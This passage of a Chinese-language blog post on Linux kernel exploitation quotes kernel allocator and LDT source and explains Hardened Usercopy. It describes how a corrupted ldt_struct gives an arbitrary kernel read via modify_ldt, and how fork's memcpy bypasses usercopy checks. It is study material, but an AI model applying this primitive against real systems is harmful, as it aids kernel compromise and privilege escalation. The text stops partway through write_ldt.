class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The largest kmalloc size supported by the SLAB allocators is</span></span><br><span class="line"><span class="comment"> * 32 megabyte (2^25) or the maximum allocatable page order if that is</span></span><br><span class="line"><span class="comment"> * less than 32 MB.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * WARNING: Its not easy to increase this value since the allocators have</span></span><br><span class="line"><span class="comment"> * to do various tricks to work around compiler limitations in order to</span></span><br><span class="line"><span class="comment"> * ensure proper constant folding.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_HIGH((MAX_ORDER + PAGE_SHIFT - 1) &lt;= 25 ? \</span></span><br><span class="line"><span class="meta">(MAX_ORDER + PAGE_SHIFT - 1) : 25)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_MAXKMALLOC_SHIFT_HIGH</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_SHIFT_LOW</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_LOW5</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SLUB directly allocates requests fitting in to an order-1 page</span></span><br><span class="line"><span class="comment"> * (PAGE_SIZE*2).  Larger requests are passed to the page allocator.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_HIGH(PAGE_SHIFT + 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_MAX(MAX_ORDER + PAGE_SHIFT - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_SHIFT_LOW</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_LOW3</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLOB</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SLOB passes all requests larger than one page to the page allocator.</span></span><br><span class="line"><span class="comment"> * No kmalloc array is necessary since objects of different sizes can</span></span><br><span class="line"><span class="comment"> * be allocated from the same page.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_HIGHPAGE_SHIFT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_MAX(MAX_ORDER + PAGE_SHIFT - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_SHIFT_LOW</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_LOW3</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maximum allocatable size */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_MAX_SIZE(1UL &lt;&lt; KMALLOC_SHIFT_MAX)</span></span><br><span class="line"><span class="comment">/* Maximum size for which we actually use a slab cache */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_MAX_CACHE_SIZE(1UL &lt;&lt; KMALLOC_SHIFT_HIGH)</span></span><br><span class="line"><span class="comment">/* Maximum order allocatable via the slab allocagtor */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_MAX_ORDER(KMALLOC_SHIFT_MAX - PAGE_SHIFT)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Kmalloc subsystem.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_MIN_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_MIN_SIZE (1 &lt;&lt; KMALLOC_SHIFT_LOW)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This restriction comes from byte sized index implementation.</span></span><br><span class="line"><span class="comment"> * Page size is normally 2^12 bytes and, in this case, if we want to use</span></span><br><span class="line"><span class="comment"> * byte sized index which can represent 2^8 entries, the size of the object</span></span><br><span class="line"><span class="comment"> * should be equal or greater to 2^12 / 2^8 = 2^4 = 16.</span></span><br><span class="line"><span class="comment"> * If minimum size of kmalloc is less than 16, we use it as minimum object</span></span><br><span class="line"><span class="comment"> * size and give up to use byte sized index.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_OBJ_MIN_SIZE      (KMALLOC_MIN_SIZE &lt; 16 ? \</span></span><br><span class="line"><span class="meta">                               (KMALLOC_MIN_SIZE) : 16)</span></span><br></pre></td></tr></table></figure><p>可以看到slub和slob的最小obj大小都是8</p><p>slab的最小obj大小则是32</p><h2 id="Hardened-Usercopy"><a href="#Hardened-Usercopy" class="headerlink" title="Hardened Usercopy"></a>Hardened Usercopy</h2><p>在开启该保护后,针对<code>copy_from_user</code>和<code>copy_to_user</code>两个函数会多出不少检查</p><p><code>copy_from_user</code>有如下检查</p><ul><li>目标地址是否合法</li><li>目标地址是否在堆中</li><li>目标地址是否为slab中的object</li><li>目标地址是否非内核.text段内地址</li></ul><p><code>copy_to_user</code>有如下检查</p><ul><li>源地址是否非内核.text段内地址</li></ul><h2 id="ldt"><a href="#ldt" class="headerlink" title="ldt"></a>ldt</h2><p>ldt 即<strong>局部段描述符表</strong>(<strong>Local Descriptor Table</strong>)，其中存放着<strong>进程的</strong>段描述符，段寄存器当中存放着的段选择子便是段描述符表中段描述符的索引</p><p>定义如下(<code>/arch/x86/include/asm/mmu_context.h</code>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ldt_structs can be allocated, used, and freed, but they are never</span></span><br><span class="line"><span class="comment"> * modified while live.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Xen requires page-aligned LDTs with special permissions.  This is</span></span><br><span class="line"><span class="comment"> * needed to prevent us from installing evil descriptors such as</span></span><br><span class="line"><span class="comment"> * call gates.  On native, we could merge the ldt_struct and LDT</span></span><br><span class="line"><span class="comment"> * allocations, but it&#x27;s not worth trying to optimize.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>*<span class="title">entries</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>nr_entries;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If PTI is in use, then the entries array is not mapped while we&#x27;re</span></span><br><span class="line"><span class="comment"> * in user mode.  The whole array will be aliased at the addressed</span></span><br><span class="line"><span class="comment"> * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span></span><br><span class="line"><span class="comment"> * and map, and enable a new LDT without invalidating the mapping</span></span><br><span class="line"><span class="comment"> * of an older, still-in-use LDT.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span>slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>结构体大小是<code>0x10</code>,slub中会在<code>kmalloc-16</code>申请,slab则会在<code>kmalloc-32</code>申请</p><p>entries指向一个数组</p><p>nr_entries记录着数组的数量</p><p><code>struct desc_struct</code>即使段描述符,定义如下(<code>/arch/x86/include/asm/desc_defs.h</code>),暂时不管他</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 8 byte segment descriptor */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">u16limit0;</span><br><span class="line">u16base0;</span><br><span class="line">u16base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">u16limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure><details class="folding-tag" cyan><summary> desc_struct结构体 </summary>              <div class='content'>              <p><strong>高 32 位</strong></p><div class="table-container"><table><thead><tr><th style="text-align:center">31~24</th><th style="text-align:center">23</th><th style="text-align:center">22</th><th style="text-align:center">21</th><th style="text-align:center">20</th><th style="text-align:center">19~16</th><th style="text-align:center">15</th><th style="text-align:center">14~13</th><th style="text-align:center">12</th><th style="text-align:center">11~8</th><th style="text-align:center">7~0</th></tr></thead><tbody><tr><td style="text-align:center">段基址的 31~24 位</td><td style="text-align:center">G</td><td style="text-align:center">D/B</td><td style="text-align:center">L</td><td style="text-align:center">AVL</td><td style="text-align:center">段界限的 19 ~16 位</td><td style="text-align:center">P</td><td style="text-align:center">DPL</td><td style="text-align:center">S</td><td style="text-align:center">TYPE</td><td style="text-align:center">段基址的 23~16 位</td></tr></tbody></table></div><ul><li>G (ranularity)：段粒度大小，4 KB（1） / 1B （0）</li><li>D/B：对代码段而言为D位，对数据段而言为B位；该位为1表示有效操作数为32位，0则为16位</li><li>L：是否为64位段描述符，1为是</li><li>AVL：available位，暂且无用</li><li>P：即 present，用以标识该段在内存中是否存在，1为存在</li><li>DPL：Descriptor Priviledge Level，即特权级别，00 对应 ring 0，11 对应 ring 3</li><li>S：是否为<strong>系统段</strong>，0表示系统段，1表示非系统段</li><li>TYPE：段类型</li></ul><p>其中，对于段的 TYPE 字段说明如下（下表摘自《操作系统真象还原》）：</p><ul><li>系统段</li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">段类型</th><th style="text-align:center">3</th><th style="text-align:center">2</th><th style="text-align:center">1</th><th style="text-align:center">0</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">未定义</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">保留</td></tr><tr><td style="text-align:center">可用的 80286 TSS</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">仅限 286 的任务状态段</td></tr><tr><td style="text-align:center">LDT</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">局部描述符表</td></tr><tr><td style="text-align:center">忙碌的 80286 TSS</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">仅限 286， 其中第一位由CPU设置</td></tr><tr><td style="text-align:center">80286 调用门</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">仅限 286</td></tr><tr><td style="text-align:center">任务门</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">在现在操作系统中已很少用到</td></tr><tr><td style="text-align:center">80286 中断门</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">仅限 286</td></tr><tr><td style="text-align:center">80286 陷阱门</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">仅限 286</td></tr><tr><td style="text-align:center">未定义</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">保留</td></tr><tr><td style="text-align:center">可用的 80386 TSS</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">386 以上 CPU 的 TSS</td></tr><tr><td style="text-align:center">未定义</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">保留</td></tr><tr><td style="text-align:center">忙碌的 80386 TSS</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">386 以上 CPU 的 TSS，第一位由CPU设置</td></tr><tr><td style="text-align:center">80386 调用门</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">386 以上 CPU 的调用门</td></tr><tr><td style="text-align:center">未定义</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">保留</td></tr><tr><td style="text-align:center">中断门</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">386 以上 CPU 的中断门</td></tr><tr><td style="text-align:center">陷阱门</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">386 以上 CPU 的陷阱门</td></tr></tbody></table></div><ul><li>非系统段</li></ul><div class="table-container"><table><thead><tr><th style="text-align:center">段类型</th><th style="text-align:center">X</th><th style="text-align:center">C</th><th style="text-align:center">R</th><th style="text-align:center">A</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">代码段</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">*</td><td style="text-align:center">只执行代码段</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">*</td><td style="text-align:center">可执行、可读代码段</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">*</td><td style="text-align:center">可执行、一致性代码段</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">*</td><td style="text-align:center">可读、可执行、一致性代码段</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th style="text-align:center">段类型</th><th style="text-align:center">X</th><th style="text-align:center">E</th><th style="text-align:center">W</th><th style="text-align:center">A</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">数据段</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">0</td><td style="text-align:center">*</td><td style="text-align:center">只读数据段</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">1</td><td style="text-align:center">*</td><td style="text-align:center">可读写数据段</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">0</td><td style="text-align:center">*</td><td style="text-align:center">只读、向下扩展数据段</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">1</td><td style="text-align:center">*</td><td style="text-align:center">可读写、向下扩展数据段</td></tr></tbody></table></div><p>通常情况下数据段向高地址增长，对于标识了E（xtend）位的数据段则向低地址增长（比如说栈段就是这样一个数据段）</p><p><strong>低 32 位</strong></p><div class="table-container"><table><thead><tr><th style="text-align:center">31~16</th><th style="text-align:center">15~0</th></tr></thead><tbody><tr><td style="text-align:center">段基址的 15~0 位</td><td style="text-align:center">段界限的 15~0 位</td></tr></tbody></table></div><p>段基址 32 位，段界限为 20 位，其所能够表示的地址范围为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">段基址 + （段粒度大小 x （段界限+1）） - 1</span><br></pre></td></tr></table></figure>              </div>            </details><p>Linux 提供 <code>modify_ldt</code> 系统调用，通过该系统调用可以<strong>获取或修改当前进程的 LDT</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="type">int</span> , func , <span class="type">void</span> __user * , ptr ,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (func) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">ret = read_ldt(ptr, bytecount);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">ret = read_default_ldt(ptr, bytecount);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment"> * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment"> * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment"> * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment"> * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment"> * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment"> * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="read-ldt"><a href="#read-ldt" class="headerlink" title="read_ldt"></a>read_ldt</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">read_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> entries_size;</span><br><span class="line"><span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">down_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!mm-&gt;context.ldt) &#123;</span><br><span class="line">retval = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bytecount &gt; LDT_ENTRY_SIZE * LDT_ENTRIES)</span><br><span class="line">bytecount = LDT_ENTRY_SIZE * LDT_ENTRIES;</span><br><span class="line"></span><br><span class="line">entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;</span><br><span class="line"><span class="keyword">if</span> (entries_size &gt; bytecount)</span><br><span class="line">entries_size = bytecount;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">retval = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (entries_size != bytecount) &#123;</span><br><span class="line"><span class="comment">/* Zero-fill the rest and pretend we read bytecount bytes. */</span></span><br><span class="line"><span class="keyword">if</span> (clear_user(ptr + entries_size, bytecount - entries_size)) &#123;</span><br><span class="line">retval = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">retval = bytecount;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"><span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中两个常量宏的定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Maximum number of LDT entries supported. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRIES8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDT_ENTRY_SIZE8</span></span><br></pre></td></tr></table></figure><p>重点看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">retval = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们能够修改ldt结构的entries结构,便能够做到任意读</p><p>并且<u>copy_from_user和copy_to_user的返回值均是未成功copy的数量</u>,可以以此判断是否命中</p><h4 id="大范围搜索内存"><a href="#大范围搜索内存" class="headerlink" title="大范围搜索内存"></a>大范围搜索内存</h4><p>不过就算read_ldt能够帮助我们搜索内存,但是仍然无法完全避免<code>hardened usercopy</code>的影响</p><p>但观察 fork 系统调用的源码，我们可以发现如下执行链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sys_fork()</span><br><span class="line">    kernel_clone()</span><br><span class="line">        copy_process()</span><br><span class="line">            copy_mm()</span><br><span class="line">                dup_mm()</span><br><span class="line">                    dup_mmap()</span><br><span class="line">                        arch_dup_mmap()</span><br><span class="line">                            ldt_dup_context()</span><br></pre></td></tr></table></figure><p>ldt_dup_context() 定义于 <code>arch/x86/kernel/ldt.c</code> 中，逻辑如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Called on fork from arch_dup_mmap(). Just copy the current LDT state,</span></span><br><span class="line"><span class="comment"> * the new task is not running, so nothing can be installed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ldt_dup_context</span><span class="params">(<span class="keyword">struct</span> mm_struct *old_mm, <span class="keyword">struct</span> mm_struct *mm)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_mm-&gt;context.ldt-&gt;entries,</span><br><span class="line">           new_ldt-&gt;nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>new_ldt-&gt;nr_entries</code>由<code>old_ldt-&gt;nr_entries</code>赋值</p><p>在这里会通过 memcpy 将父进程的 ldt-&gt;entries 拷贝给子进程，<strong>是完全处在内核中的操作</strong>,因此能够绕过<code>hardened usercopy</code>的检查</p><p>当父进程设置目标地址后,再打开子进程,便会将目标地址处的内容复制到子进程的ldt中,之后再使用read_ldt便能够直接读取</p><h3 id="write-ldt"><a href="#write-ldt" class="headerlink" title="write_ldt"></a>write_ldt</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span 